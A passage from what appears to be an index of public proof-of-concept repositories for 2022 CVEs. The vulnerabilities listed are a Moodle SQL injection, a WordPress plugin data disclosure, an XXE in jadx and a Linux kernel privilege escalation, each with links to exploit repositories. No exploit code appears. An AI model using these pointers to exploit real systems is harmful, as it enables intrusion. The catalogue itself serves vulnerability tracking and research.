- [https://github.com/Puliczek/CVE-2022-0337-PoC-Google-Chrome-Microsoft-Edge-Opera](https://github.com/Puliczek/CVE-2022-0337-PoC-Google-Chrome-Microsoft-Edge-Opera) :  ![starts](https://img.shields.io/github/stars/Puliczek/CVE-2022-0337-PoC-Google-Chrome-Microsoft-Edge-Opera.svg) ![forks](https://img.shields.io/github/forks/Puliczek/CVE-2022-0337-PoC-Google-Chrome-Microsoft-Edge-Opera.svg)

## CVE-2022-0332
 A flaw was found in Moodle in versions 3.11 to 3.11.4. An SQL injection risk was identified in the h5p activity web service responsible for fetching user attempt data.



- [https://github.com/numanturle/CVE-2022-0332](https://github.com/numanturle/CVE-2022-0332) :  ![starts](https://img.shields.io/github/stars/numanturle/CVE-2022-0332.svg) ![forks](https://img.shields.io/github/forks/numanturle/CVE-2022-0332.svg)

## CVE-2022-0236
 The WP Import Export WordPress plugin (both free and premium versions) is vulnerable to unauthenticated sensitive data disclosure due to a missing capability check on the download function wpie_process_file_download found in the ~/includes/classes/class-wpie-general.php file. This made it possible for unauthenticated attackers to download any imported or exported information from a vulnerable site which can contain sensitive information like user data. This affects versions up to, and including, 3.9.15.



- [https://github.com/qurbat/CVE-2022-0236](https://github.com/qurbat/CVE-2022-0236) :  ![starts](https://img.shields.io/github/stars/qurbat/CVE-2022-0236.svg) ![forks](https://img.shields.io/github/forks/qurbat/CVE-2022-0236.svg)

- [https://github.com/xiska62314/CVE-2022-0236](https://github.com/xiska62314/CVE-2022-0236) :  ![starts](https://img.shields.io/github/stars/xiska62314/CVE-2022-0236.svg) ![forks](https://img.shields.io/github/forks/xiska62314/CVE-2022-0236.svg)

## CVE-2022-0219
 Improper Restriction of XML External Entity Reference in GitHub repository skylot/jadx prior to 1.3.2.



- [https://github.com/Haxatron/CVE-2022-0219](https://github.com/Haxatron/CVE-2022-0219) :  ![starts](https://img.shields.io/github/stars/Haxatron/CVE-2022-0219.svg) ![forks](https://img.shields.io/github/forks/Haxatron/CVE-2022-0219.svg)

## CVE-2022-0185
 A heap-based buffer overflow flaw was found in the way the legacy_parse_param function in the Filesystem Context functionality of the Linux kernel verified the supplied parameters length. An unprivileged (in case of unprivileged user namespaces enabled, otherwise needs namespaced CAP_SYS_ADMIN privilege) local user able to open a filesystem that does not support the Filesystem Context API (and thus fallbacks to legacy handling) could use this flaw to escalate their privileges on the system.



- [https://github.com/Crusaders-of-Rust/CVE-2022-0185](https://github.com/Crusaders-of-Rust/CVE-2022-0185) :  ![starts](https://img.shields.io/github/stars/Crusaders-of-Rust/CVE-2022-0185.svg) ![forks](https://img.shields.io/github/forks/Crusaders-of-Rust/CVE-2022-0185.svg)

- [https://github.com/chenaotian/CVE-2022-0185](https://github.com/chenaotian/CVE-2022-0185) :  ![starts](https://img.shields.io/github/stars/chenaotian/CVE-2022-0185.svg) ![forks](https://img.shields.io/github/forks/chenaotian/CVE-2022-0185.svg)

- [https://github.com/discordianfish/cve-2022-0185-crash-poc](https://github.com/discordianfish/cve-2022-0185-crash-poc) :  ![starts](https://img.shields.io/github/stars/discordianfish/cve-2022-0185-crash-poc.svg) ![forks](https://img.shields.io/github/forks/discordianfish/cve-2022-0185-crash-poc.svg)

- [https://github.com/shahparkhan/cve-2022-0185](https://github.com/shahparkhan/cve-2022-0185) :  ![starts](https://img.shields.io/github/stars/shahparkhan/cve-2022-0185.svg) ![forks](https://img.shields.io/github/forks/shahparkhan/cve-2022-0185.svg)

- [https://github.com/khaclep007/CVE-2022-0185](https://github.com/khaclep007/CVE-2022-0185) :  ![starts](https://img.shields.io/github/stars/khaclep007/CVE-2022-0185.svg) ![forks](https://img.shields.io/github/forks/khaclep007/CVE-2022-0185.svg)
